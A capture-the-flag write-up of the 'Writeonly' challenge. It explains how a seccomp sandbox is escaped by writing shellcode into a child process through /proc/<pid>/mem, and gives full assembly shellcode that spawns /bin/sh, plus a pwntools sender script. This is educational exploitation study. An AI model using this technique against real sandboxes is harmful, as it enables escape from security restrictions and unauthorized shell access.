# Writeonly

**Problem Description:**

> This sandbox executes any shellcode you send. But thanks to seccomp, you won't be able to read /home/user/flag.<br>
>
> [Attachment](./0b7877f4d70435dae7d7585532c5fa96ea2cadb0aa8e35be371b8e575d2ecd51ad6d2588a7e2493ff048a541610381b1b284917a820673cce108ea107836d238)<br>
>
> `writeonly.2020.ctfcompetition.com 1337`

## Solution

I got tired of running `file` on the attachment and figured it'd be a `zip` and just unzipped it. There were three files:

- [Makefile](./Makefile)
- [chal.c](./chal.c)
- [chal](./chal)

Since the source code was given, I figured I'd take a look at it. The very second function looked rather interesting:

```c
void setup_seccomp() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_KILL);
  int ret = 0;
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), 0);
  ...
  ret |= seccomp_load(ctx);
  if (ret) {
    exit(1);
  }
}
```

Looks like an inclusion list for syscalls, and as the description hinted, `read` wasn't one of them :(

Heading down a bit, we see the following:

```c
void check_flag() {
  while (1) {
    char buf[4] = "";
    int fd = check(open("/home/user/flag", O_RDONLY), "open(flag)");
    if (read(fd, buf, sizeof(buf)) != sizeof(buf)) {
      err(1, "read(flag)");
    }
    close(fd);
    if (memcmp(buf, "CTF{", sizeof(buf)) != 0) {
      errx(1, "flag doesn't start with CTF{");
    }
    sleep(1);
  }
}

int main(int argc, char *argv[]) {
  pid_t pid = check(fork(), "fork");
  if (!pid) {
    while (1) {
      check_flag();
    }
    return 0;
  }

  printf("[DEBUG] child pid: %d\n", pid);
  void_fn sc = read_shellcode();
  setup_seccomp();
  sc();

  return 0;
}
```

So, the program `fork`s itself into a parent and child. The parent:

1. Prints the child's PID
2. Reads the shellcode from `stdin`
3. Sets up seccomp
4. Runs the shellcode

Meanwhile, the child:

1. Infinitely loops, calling `check_flag` each iteration. 
2. `check_flag`, also infinitely loops and reads and compares the first 4 bytes of the flag every second...

Eventually, I noticed the child will never call `setup_seccomp` and can thus call any syscall it desires (which is why, it is able to call `read` in `check_flag`). Furthermore, the child PID was also being printed out by the parent. Thus, our shellcode must most likely tamper with the child somehow to read the flag.<sup name="rn1">[[1]](#fn1)</sup>

However, I was at a loss on how to progress, as there seemed to be no way for us to interact with the child, no IPC, nothing. Breadsticks came in clutch, and realized that we could write to `/proc/<pid>/mem`. So, I wrote the following [snippet](./exploit.asm), to make the parent overwrite some instructions in the child's `check_flag` to spawn a shell:<sup name="rn2">[[2]](#fn2)</sup>

```assembly
bits 64

write equ 1
open equ 2
lseek equ 8
execve equ 59
wait4 equ 61
O_WRONLY equ 1
SEEK_SET equ 0
snprintf equ 47e660h ; thanks for no PIE and linking snprintf
patch_offset equ 40223ah ; check_flag+8 (start of while loop body)

main:
    push rbp ; snprintf needs stack to be aligned, so we push something
    ; snprintf(child_mem_path_buf, sizeof(child_mem_path_buf), "/proc/%d/mem", pid)
    mov rax, snprintf
    lea rdi, [rel child_mem_path_buf]
    mov rsi, child_mem_path_buf_size
    lea rdx, [rel child_mem_path_fmt]
    mov ecx, DWORD [rbp-4] ; get pid from the stack
    call rax

    ; open(child_mem_path_buf, O_WRONLY)
    mov rax, open
    lea rdi, [rel child_mem_path_buf]
    mov rsi, O_WRONLY
    syscall

    mov r12, rax ; backup fd into r12
    ; lseek(fd, patch_offset, SEEK_SET)
    mov rax, lseek
    mov rdi, r12
    mov rsi, patch_offset
    mov rdx, SEEK_SET
    syscall

    ; write(fd, payload, payload_len)
    mov rax, write
    mov rdi, r12
    lea rsi, [rel payload]
    mov rdx, payload_len
    syscall

    infinite: jmp infinite ; for some reason this is needed for remote
    leave
    ret
    child_mem_path_fmt db "/proc/%d/mem", 0h
    child_mem_path_buf times 22 db 0h
    child_mem_path_buf_size equ $-child_mem_path_buf

payload:
    ; execve("/bin/sh", NULL, NULL);
    mov rax, execve
    lea rdi, [rel sh]
    xor rsi, rsi
    xor rdx, rdx
    syscall
    ret
    sh db "/bin/sh", 0h

payload_len equ $-payload
```

I also came up with the following [script](./solve.py) to assemble and send the shellcode:

```python
from subprocess import run
from pwn import remote

run(["nasm", "exploit.asm"], check=True)
r = remote('writeonly.2020.ctfcompetition.com', 1337)
with open('exploit', 'rb') as f:
    payload = f.read()
    r.sendline(str(len(payload)))
    r.sendline(payload)
    r.interactive()
```

Running the above script:

```bash
$ python3 solve.py
[+] Opening connection to writeonly.2020.ctfcompetition.com on port 1337: Done
[*] Switching to interactive mode
[DEBUG] child pid: 2
shellcode length? reading 162 bytes of shellcode.
$ cat /home/user/flag
CTF{why_read_when_you_can_write}
```

## Footnotes

<a name="fn1" href="#rn1">[1]:</a> Upon saying a slightly different version of this sentence out loud to breadsticks, I realized exactly how ridiculous it sounds when interpreted without context...
<a name="fn2" href="#rn2">[2]:</a> The `snprintf` part of the shellcode was not necessary. I could have instead read `stdout` and crafted the shellcode at runtime using pwntools' `asm` function (it even recognizes constants like `SYS_open` too). I only came to know of this later through breadsticks :(